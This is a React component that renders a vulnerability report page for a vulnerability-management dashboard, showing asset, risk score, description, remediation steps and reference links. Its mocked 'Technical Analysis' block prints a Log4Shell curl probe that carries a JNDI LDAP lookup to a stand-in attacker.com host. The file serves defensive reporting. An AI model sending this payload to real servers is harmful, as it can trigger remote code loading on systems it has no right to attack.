import React from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { VulnList } from '../data';
import { Severity } from '../types';

const Reports: React.FC = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const id = searchParams.get('id');
  const selectedVuln = VulnList.find(v => v.id === id);

  if (!id || !selectedVuln) {
    return (
      <div className="flex flex-col h-full items-center justify-center text-secondary">
        <span className="material-symbols-outlined text-6xl mb-4 opacity-50">description</span>
        <h2 className="text-xl font-medium text-white">No Report Selected</h2>
        <p className="mt-2">Please select a vulnerability from the Vulnerabilities page to view its report.</p>
        <button 
          onClick={() => navigate('/vulnerabilities')}
          className="mt-6 px-4 py-2 bg-primary text-white rounded hover:bg-blue-600 transition-colors"
        >
          Go to Vulnerabilities
        </button>
      </div>
    );
  }

  return (
    <div className="flex flex-col h-full overflow-hidden bg-background">
      <header className="flex-shrink-0 px-8 py-4 border-b border-border bg-background/95 backdrop-blur-sm z-10 flex justify-between items-center">
        <div>
           <div className="flex items-center gap-2 text-sm text-secondary mb-1">
             <span className="cursor-pointer hover:text-white" onClick={() => navigate('/vulnerabilities')}>Vulnerabilities</span>
             <span className="material-symbols-outlined text-xs">chevron_right</span>
             <span>Report</span>
           </div>
           <h1 className="text-2xl font-bold tracking-tight text-white flex items-center gap-3">
             <span className="material-symbols-outlined text-3xl text-primary">summarize</span>
             Vulnerability Report
           </h1>
        </div>
        <div className="flex gap-3">
          <button className="flex items-center gap-2 px-4 py-2 bg-surface border border-border rounded hover:bg-border transition-colors text-white text-sm font-medium">
             <span className="material-symbols-outlined text-[20px]">print</span>
             Print
          </button>
          <button className="flex items-center gap-2 px-4 py-2 bg-primary rounded hover:bg-blue-600 transition-colors text-white text-sm font-medium shadow-lg shadow-primary/20">
             <span className="material-symbols-outlined text-[20px]">download</span>
             Download PDF
          </button>
        </div>
      </header>

      <div className="flex-1 overflow-y-auto p-8 custom-scroll bg-[#0d1117]">
        <div className="max-w-[850px] mx-auto bg-white text-slate-900 rounded-sm shadow-2xl min-h-[1100px] overflow-hidden">
          
          {/* Report Header */}
          <div className="bg-[#111418] text-white p-10 border-b-4 border-primary">
            <div className="flex justify-between items-start">
               <div>
                  <h1 className="text-3xl font-bold mb-2">{selectedVuln.name}</h1>
                  <p className="text-secondary font-mono">{selectedVuln.cve}</p>
               </div>
               <div className="text-right">
                  <div className="inline-flex items-center px-3 py-1 rounded bg-surface border border-border">
                     <span className={`w-2 h-2 rounded-full mr-2 ${selectedVuln.severity === Severity.CRITICAL ? 'bg-red-500' : 'bg-orange-500'}`}></span>
                     <span className="font-bold text-sm uppercase tracking-wide">{selectedVuln.severity}</span>
                  </div>
                  <p className="text-xs text-secondary mt-2">Discovered: {selectedVuln.discoveredAt}</p>
               </div>
            </div>
          </div>

          <div className="p-10 flex flex-col gap-8">
             
             {/* Asset Info */}
             <div className="flex gap-6 p-4 bg-slate-50 border border-slate-200 rounded">
                <div className="flex-1">
                   <span className="text-xs font-bold text-slate-500 uppercase tracking-wider">Affected Asset</span>
                   <p className="text-lg font-semibold text-slate-800 flex items-center gap-2 mt-1">
                      <span className="material-symbols-outlined text-slate-400">dns</span>
                      {selectedVuln.asset}
                   </p>
                </div>
                <div className="flex-1 border-l border-slate-200 pl-6">
                   <span className="text-xs font-bold text-slate-500 uppercase tracking-wider">Risk Score</span>
                   <div className="flex items-center gap-2 mt-1">
                      <div className="w-full max-w-[100px] h-2 bg-slate-200 rounded-full overflow-hidden">
                         <div className="h-full bg-primary" style={{width: `${selectedVuln.aiScore}%`}}></div>
                      </div>
                      <span className="font-bold text-primary">{selectedVuln.aiScore}/100</span>
                   </div>
                </div>
                <div className="flex-1 border-l border-slate-200 pl-6">
                   <span className="text-xs font-bold text-slate-500 uppercase tracking-wider">Status</span>
                   <p className="font-semibold text-slate-800 mt-1">{selectedVuln.status}</p>
                </div>
             </div>

             {/* Description */}
             <section>
                <h3 className="text-lg font-bold text-slate-900 border-b border-slate-200 pb-2 mb-3 flex items-center gap-2">
                   <span className="material-symbols-outlined text-slate-400">info</span>
                   Executive Summary & Description
                </h3>
                <p className="text-slate-700 leading-relaxed text-sm">
                   {selectedVuln.description}
                </p>
             </section>

             {/* Technical Details (Mocked for layout) */}
             <section>
                <h3 className="text-lg font-bold text-slate-900 border-b border-slate-200 pb-2 mb-3 flex items-center gap-2">
                   <span className="material-symbols-outlined text-slate-400">code</span>
                   Technical Analysis
                </h3>
                <div className="bg-slate-900 text-slate-300 p-4 rounded font-mono text-xs overflow-x-auto">
                   <p className="mb-2">Scanning Module: plugins/remote/log4j_check.nasl</p>
                   <p className="text-green-400">$ curl -H "X-Api-Version: ${'{jndi:ldap://attacker.com/exploit}'}" http://{selectedVuln.asset}/api/v1/login</p>
                   <p className="mt-2 text-yellow-400">[!] Payload triggered remote connection to listener.</p>
                </div>
             </section>

             {/* Remediation */}
             <section>
                <h3 className="text-lg font-bold text-slate-900 border-b border-slate-200 pb-2 mb-3 flex items-center gap-2">
                   <span className="material-symbols-outlined text-slate-400">healing</span>
                   Remediation Plan
                </h3>
                <div className="bg-blue-50 border border-blue-100 p-4 rounded">
                   <p className="text-slate-800 text-sm font-medium mb-2">Recommendation:</p>
                   <pre className="whitespace-pre-wrap text-sm text-slate-700 font-mono">{selectedVuln.remediation}</pre>
                </div>
             </section>

             {/* References */}
             <section>
                <h3 className="text-lg font-bold text-slate-900 border-b border-slate-200 pb-2 mb-3 flex items-center gap-2">
                   <span className="material-symbols-outlined text-slate-400">bookmark</span>
                   References
                </h3>
                <ul className="list-disc list-inside text-sm text-blue-600 space-y-1">
                   <li><a href="#" className="hover:underline">https://nvd.nist.gov/vuln/detail/{selectedVuln.cve}</a></li>
                   <li><a href="#" className="hover:underline">https://logging.apache.org/log4j/2.x/security.html</a></li>
                </ul>
             </section>

          </div>
          
          <div className="bg-slate-50 p-6 text-center text-xs text-slate-500 border-t border-slate-200 mt-auto">
             Generated by VMS Bridge - Vulnerability Management System Bridge • Confidential Document
          </div>
        </div>
      </div>
    </div>
  );
};

export default Reports;